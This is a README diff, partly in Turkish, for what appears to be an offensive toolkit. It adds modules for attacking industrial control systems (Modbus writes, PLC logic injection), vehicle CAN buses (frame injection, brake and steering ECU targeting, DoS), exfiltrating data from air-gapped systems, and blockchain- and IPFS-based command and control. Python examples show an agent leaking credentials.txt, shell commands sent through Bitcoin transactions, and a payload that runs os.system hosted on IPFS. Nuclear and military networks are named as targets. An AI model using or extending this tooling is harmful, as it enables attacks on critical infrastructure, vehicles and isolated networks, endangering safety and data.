@@ -35,6 +35,10 @@
 - [Cross-Module Integration](#-cross-module-integration)
 - [K8s Kraken - Kubernetes Warfare](#-k8s-kraken---kubernetes-warfare-february-2026)
 - [Orbital & RF Warfare](#-orbital--rf-warfare-february-2026)
+- [SCADA & ICS Hunter](#-scada--ics-hunter-february-2026)
+- [Automotive & CAN Bus Hacking](#-automotive--can-bus-hacking-february-2026)
+- [Air-Gap Jumping](#-air-gap-jumping-february-2026)
+- [Blockchain & Decentralized C2](#-blockchain--decentralized-c2-february-2026)
 - [C2 Implant Framework](#-c2-implant-framework)
 
 ---
@@ -234,7 +238,19 @@ monolith/
 │   ├── supply_chain_attack.py      # Supply Chain Attack Suite (~1400 lines) [CHAIN]
 │   │
 │   │   # 📡 ORBITAL & RF WARFARE (February 2026)
-│   └── orbital_rf_warfare.py       # SatCom Sniffer, GPS Spoof, IMSI Catcher (~1000 lines) [SDR]
+│   ├── orbital_rf_warfare.py       # SatCom Sniffer, GPS Spoof, IMSI Catcher (~1000 lines) [SDR]
+│   │
+│   │   # 🏭 SCADA & ICS HUNTER (February 2026)
+│   ├── scada_ics_hunter.py         # Modbus/DNP3/OPC Scanner, PLC Exploitation (~800 lines) [ICS]
+│   │
+│   │   # 🚗 AUTOMOTIVE & CAN BUS (February 2026)
+│   ├── automotive_canbus.py        # CAN Bus Sniffer, ECU Fuzzing, DoS (~700 lines) [VEHICLE]
+│   │
+│   │   # 🔌 AIR-GAP JUMPING (February 2026)
+│   ├── airgap_jumper.py            # Ultrasonic Exfil, LED Morse, Covert Channels (~600 lines) [AIRGAP]
+│   │
+│   │   # ₿ BLOCKCHAIN & DECENTRALIZED C2 (February 2026)
+│   └── blockchain_c2.py            # Bitcoin OP_RETURN, IPFS Hosting, ETH Contract (~700 lines) [UNSTOPPABLE]
 │
 ├── 📂 templates/                   # Web UI Templates (~50+ pages)
 │   ├── dashboard.html              # Main dashboard
@@ -257,6 +273,10 @@ monolith/
 │   ├── supply_chain_attack.html    # Supply chain attack dashboard
 │   ├── k8s_warfare.html            # K8s Kraken - Kubernetes Warfare dashboard
 │   ├── orbital_rf_warfare.html     # Orbital RF Warfare - SDR Operations
+│   ├── scada_ics_hunter.html       # SCADA/ICS Hunter - Industrial Control Systems
+│   ├── automotive_canbus.html      # Automotive CAN Bus - Vehicle Hacking
+│   ├── airgap_jumper.html          # Air-Gap Jumper - Covert Exfiltration
+│   ├── blockchain_c2.html          # Blockchain C2 - Decentralized Command & Control
 │   └── ...
 │
 ├── 📂 configs/                     # Configuration Files
@@ -3907,6 +3927,265 @@ print(f"By Provider: {analysis['by_provider']}")
 
 ---
 
+## 🏭 SCADA & ICS Hunter (February 2026)
+
+Endüstriyel Kontrol Sistemleri (ICS) keşif ve saldırı modülü.
+
+```
+┌─────────────────────────────────────────────────────────────────────────────────────────┐
+│                           🏭 SCADA & ICS HUNTER                                          │
+│                    Industrial Control System Attack Suite                                │
+│                          Critical Infrastructure Testing                                 │
+└─────────────────────────────────────────────────────────────────────────────────────────┘
+
+┌──────────────────────────────────────────────────────────────────────────────────────────┐
+│  SUPPORTED PROTOCOLS                        ATTACK VECTORS                               │
+├──────────────────────────────────────────────────────────────────────────────────────────┤
+│                                                                                          │
+│  ┌─────────────────────────────┐           ┌─────────────────────────────┐              │
+│  │ 🔌 MODBUS TCP/RTU           │           │ 🔍 Device Discovery          │              │
+│  │    Port 502                 │           │    Network scan, Shodan     │              │
+│  │    Read/Write Coils & Regs  │           │                             │              │
+│  │                             │           │ 💉 Register Manipulation    │              │
+│  │ 🌐 DNP3 (IEEE 1815)        │           │    Write coils, holding regs│              │
+│  │    Port 20000               │           │                             │              │
+│  │    SCADA Protocol           │           │ 🎯 PLC Exploitation         │              │
+│  │                             │           │    Logic injection, DoS     │              │
+│  │ 🔗 OPC-UA                   │           │                             │              │
+│  │    Port 4840                │           │ 📊 HMI Targeting            │              │
+│  │    Industrial IoT           │           │    Screenshot, keylog       │              │
+│  │                             │           │                             │              │
+│  │ ⚡ IEC 61850               │           │ 🔓 Auth Bypass              │              │
+│  │    Power grid protocol      │           │    Default creds, brute     │              │
+│  └─────────────────────────────┘           └─────────────────────────────┘              │
+│                                                                                          │
+│  VENDOR SUPPORT: Siemens S7, Allen-Bradley, Schneider, ABB, GE, Honeywell               │
+└──────────────────────────────────────────────────────────────────────────────────────────┘
+
+API Endpoints:
+  GET  /scada/                               - SCADA Hunter Dashboard
+  POST /scada/api/scan                       - Scan for ICS devices
+  POST /scada/api/modbus/read                - Read Modbus registers
+  POST /scada/api/modbus/write               - Write Modbus registers
+  POST /scada/api/dnp3/scan                  - Scan DNP3 outstations
+  POST /scada/api/opcua/browse               - Browse OPC-UA nodes
+  GET  /scada/api/vendors                    - List known vendors
+```
+
+---
+
+## 🚗 Automotive & CAN Bus Hacking (February 2026)
+
+Araç içi ağ sistemleri ve CAN Bus saldırı modülü.
+
+```
+┌─────────────────────────────────────────────────────────────────────────────────────────┐
+│                           🚗 AUTOMOTIVE & CAN BUS                                        │
+│                       Vehicle Network Attack Framework                                   │
+│                            ECU Fuzzing & Exploitation                                    │
+└─────────────────────────────────────────────────────────────────────────────────────────┘
+
+┌──────────────────────────────────────────────────────────────────────────────────────────┐
+│  ATTACK CAPABILITIES                        TARGET ECUs                                  │
+├──────────────────────────────────────────────────────────────────────────────────────────┤
+│                                                                                          │
+│  ┌─────────────────────────────┐           ┌─────────────────────────────┐              │
+│  │ 📡 CAN Bus Sniffing         │           │ 🚗 Engine Control Module    │              │
+│  │    Real-time traffic        │           │    Throttle, fuel, ignition │              │
+│  │    ID filtering             │           │                             │              │
+│  │                             │           │ 🎮 Steering System          │              │
+│  │ 💉 Packet Injection         │           │    EPS control              │              │
+│  │    Arbitrary CAN frames     │           │                             │              │
+│  │    Replay attacks           │           │ 🚨 Brake System (ABS/ESP)   │              │
+│  │                             │           │    Safety-critical          │              │
+│  │ 🔀 ECU Fuzzing              │           │                             │              │
+│  │    Random/smart fuzzing     │           │ 📻 Infotainment (IVI)       │              │
+│  │    Crash detection          │           │    Bluetooth, WiFi          │              │
+│  │                             │           │                             │              │
+│  │ 💀 CAN DoS                  │           │ 🔑 Immobilizer/PKES         │              │
+│  │    Bus-off attack           │           │    Key fob, relay attack    │              │
+│  │    Dominant bit flooding    │           │                             │              │
+│  │                             │           │ 📍 Telematics/GPS           │              │
+│  │ 🔐 UDS Diagnostics          │           │    Remote access            │              │
+│  │    Security access          │           │                             │              │
+│  └─────────────────────────────┘           └─────────────────────────────┘              │
+│                                                                                          │
+│  HARDWARE: SocketCAN, CANtact, PCAN, Kvaser, Arduino + MCP2515                          │
+└──────────────────────────────────────────────────────────────────────────────────────────┘
+
+API Endpoints:
+  GET  /automotive/                          - Vehicle Ops Dashboard
+  POST /automotive/api/can/sniff             - Start CAN sniffing
+  POST /automotive/api/can/inject            - Inject CAN frame
+  POST /automotive/api/can/fuzz              - Start ECU fuzzing
+  POST /automotive/api/can/dos               - CAN DoS attack
+  POST /automotive/api/uds/scan              - UDS service scan
+  GET  /automotive/api/ecus                  - Known ECU database
+```
+
+---
+
+## 🔌 Air-Gap Jumping (February 2026)
+
+Hava boşluklu (izole) sistemlerden veri sızdırma modülü.
+
+```
+┌─────────────────────────────────────────────────────────────────────────────────────────┐
+│                           🔌 AIR-GAP JUMPING                                             │
+│                     Covert Exfiltration from Isolated Systems                            │
+│                          Bridging the Unbridgeable                                       │
+└─────────────────────────────────────────────────────────────────────────────────────────┘
+
+┌──────────────────────────────────────────────────────────────────────────────────────────┐
+│  EXFILTRATION CHANNELS                      SPECIFICATIONS                               │
+├──────────────────────────────────────────────────────────────────────────────────────────┤
+│                                                                                          │
+│  ┌─────────────────────────────┐           ┌─────────────────────────────┐              │
+│  │ 🔊 ULTRASONIC AUDIO         │           │ Frequency: 18-22 kHz        │              │
+│  │    Inaudible to humans      │           │ Range: ~5 meters            │              │
+│  │    Speaker → Microphone     │           │ Speed: ~20 bps              │              │
+│  │    FSK modulation           │           │ Detection: Very Low         │              │
+│  │                             │           │                             │              │
+│  │ 💡 LED MORSE CODE           │           │ Caps Lock, Scroll Lock,     │              │
+│  │    Keyboard LEDs            │           │ Num Lock, HDD LED           │              │
+│  │    HDD activity LED         │           │ Speed: ~10 bps              │              │
+│  │    Optical receiver         │           │ Range: Line of sight        │              │
+│  │                             │           │                             │              │
+│  │ 📡 ELECTROMAGNETIC          │           │ CPU/RAM emanations          │              │
+│  │    TEMPEST-style            │           │ Requires SDR receiver       │              │
+│  │    Side-channel leakage     │           │ Range: ~10 meters           │              │
+│  │                             │           │                             │              │
+│  │ 🌡️ THERMAL                  │           │ CPU heat modulation         │              │
+│  │    Heat patterns            │           │ Thermal camera receiver     │              │
+│  └─────────────────────────────┘           └─────────────────────────────┘              │
+│                                                                                          │
+│  USE CASE: Exfil from nuclear facilities, military networks, SCADA systems              │
+└──────────────────────────────────────────────────────────────────────────────────────────┘
+
+API Endpoints:
+  GET  /airgap/                              - Air-Gap Dashboard
+  POST /airgap/api/ultrasonic/encode         - Encode data for ultrasonic TX
+  POST /airgap/api/ultrasonic/decode         - Decode received audio
+  POST /airgap/api/led/encode                - Encode data for LED Morse
+  POST /airgap/api/led/generate-agent        - Generate LED exfil agent
+  GET  /airgap/api/channels                  - Available covert channels
+```
+
+### 💻 Python Usage Example
+
+```python
+from tools.airgap_jumper import AirGapJumper
+
+jumper = AirGapJumper()
+
+# Ultrasonic exfiltration (inaudible audio)
+result = jumper.encode_ultrasonic(
+    data="SECRET_DATA_HERE",
+    frequency=19000,  # 19kHz - inaudible
+    encrypt=True
+)
+# Play the generated WAV file through speakers
+
+# LED Morse exfiltration
+led_agent = jumper.generate_led_agent(
+    data_to_exfil="credentials.txt",
+    led_type="capslock",
+    speed_wpm=15
+)
+# Deploy agent to air-gapped system
+```
+
+---
+
+## ₿ Blockchain & Decentralized C2 (February 2026)
+
+Kapatılamayan sunucular! Blockchain tabanlı Command & Control.
+
+```
+┌─────────────────────────────────────────────────────────────────────────────────────────┐
+│                           ₿ BLOCKCHAIN & DECENTRALIZED C2                                │
+│                         Unstoppable Command & Control Infrastructure                     │
+│                              "Devletler Bitcoin'i Kapatamaz"                             │
+└─────────────────────────────────────────────────────────────────────────────────────────┘
+
+┌──────────────────────────────────────────────────────────────────────────────────────────┐
+│  C2 CHANNELS                                HOW IT WORKS                                 │
+├──────────────────────────────────────────────────────────────────────────────────────────┤
+│                                                                                          │
+│  ┌─────────────────────────────┐           ┌─────────────────────────────┐              │
+│  │ ₿ BITCOIN OP_RETURN         │           │ 1. Komutunu oluştur         │              │
+│  │    80-byte data field       │           │ 2. BTC transaction gönder   │              │
+│  │    Commands in blockchain   │           │ 3. ~0.0001 BTC + fee öde    │              │
+│  │    Cost: ~$1 per command    │           │ 4. Blockchain'e yazılır     │              │
+│  │    Latency: ~10 min         │           │ 5. Ajanlar blockchain izler │              │
+│  │                             │           │ 6. Komut alınır & çalışır   │              │
+│  │ 🐕 DOGECOIN/LITECOIN        │           │                             │              │
+│  │    Cheaper alternatives     │           │ Avantajlar:                 │              │
+│  │    Same OP_RETURN method    │           │ • Takedown imkansız         │              │
+│  │                             │           │ • Ajan sunucuya bağlanmaz   │              │
+│  │ 🌐 IPFS HOSTING             │           │ • Komutlar kalıcı           │              │
+│  │    Decentralized storage    │           │ • Sansürlenemez             │              │
+│  │    Content-addressed        │           │                             │              │
+│  │    Multiple gateways        │           │ IPFS Gateways:              │              │
+│  │    Uncensorable payloads    │           │ • ipfs.io                   │              │
+│  │                             │           │ • cloudflare-ipfs.com       │              │
+│  │ Ξ ETHEREUM CONTRACTS        │           │ • dweb.link                 │              │
+│  │    Smart contract C2        │           │ • gateway.pinata.cloud      │              │
+│  │    Solidity-based           │           │                             │              │
+│  └─────────────────────────────┘           └─────────────────────────────┘              │
+│                                                                                          │
+│  ENCODING: FSK modulation, XOR encryption, Base64                                       │
+│  NETWORKS: BTC Mainnet, BTC Testnet, Dogecoin, Litecoin, Ethereum                       │
+└──────────────────────────────────────────────────────────────────────────────────────────┘
+
+API Endpoints:
+  GET  /blockchain-c2/                       - Blockchain C2 Dashboard
+  POST /blockchain-c2/api/bitcoin/create-command    - Generate OP_RETURN command
+  POST /blockchain-c2/api/bitcoin/generate-agent    - Bitcoin watching agent
+  POST /blockchain-c2/api/ipfs/upload               - Upload payload to IPFS
+  POST /blockchain-c2/api/ipfs/generate-stager      - IPFS stager code
+  GET  /blockchain-c2/api/ethereum/contract         - Get smart contract code
+  POST /blockchain-c2/api/ethereum/generate-agent   - Ethereum agent
+  POST /blockchain-c2/api/full-agent                - Multi-channel agent
+  GET  /blockchain-c2/api/methods                   - Available C2 methods
+```
+
+### 💻 Python Usage Example
+
+```python
+from tools.blockchain_c2 import DecentralizedC2, CommandType
+
+c2 = DecentralizedC2()
+
+# Create Bitcoin OP_RETURN command
+result = c2.create_bitcoin_command(
+    command_type=CommandType.SHELL,
+    payload="whoami && hostname",
+    encrypt=True,
+    network="testnet"
+)
+print(f"OP_RETURN HEX: {result['op_return_hex']}")
+# Paste this hex into your Bitcoin wallet's OP_RETURN field
+
+# Upload payload to IPFS (decentralized hosting)
+ipfs_result = c2.upload_to_ipfs(
+    content="#!/usr/bin/env python3\\nimport os; os.system('whoami')",
+    filename="payload.py",
+    encrypt=True
+)
+print(f"CID: {ipfs_result['cid']}")
+print(f"Gateways: {ipfs_result['gateways']}")
+
+# Generate multi-channel agent
+agent = c2.generate_full_agent(
+    methods=["bitcoin", "ipfs", "ethereum"],
+    watch_address="1YourBTCAddressHere..."
+)
+# Deploy agent - it will monitor blockchain for commands
+```
+
+---
+
 ## 📡 C2 Implant Framework
 
 Gelişmiş Command & Control implant yönetim sistemi.
@@ -3985,6 +4264,10 @@ API Endpoints:
   ├── Cross-Module Integration:    20 templates interconnected
   ├── K8s Kraken (Kubernetes):     ~1,000 lines
   ├── Orbital RF Warfare:          ~1,000 lines (SatCom, GPS Spoof, IMSI)
+  ├── SCADA & ICS Hunter:          ~800 lines (Modbus, DNP3, OPC-UA)
+  ├── Automotive CAN Bus:          ~700 lines (ECU, DoS, Fuzzing)
+  ├── Air-Gap Jumping:             ~600 lines (Ultrasonic, LED Morse)
+  ├── Blockchain C2:               ~700 lines (Bitcoin, IPFS, Ethereum)
   ├── Telegram/Discord C2:         ~650 lines
   ├── Stego C2:                    ~550 lines
   ├── eBPF Rootkit:                ~800 lines
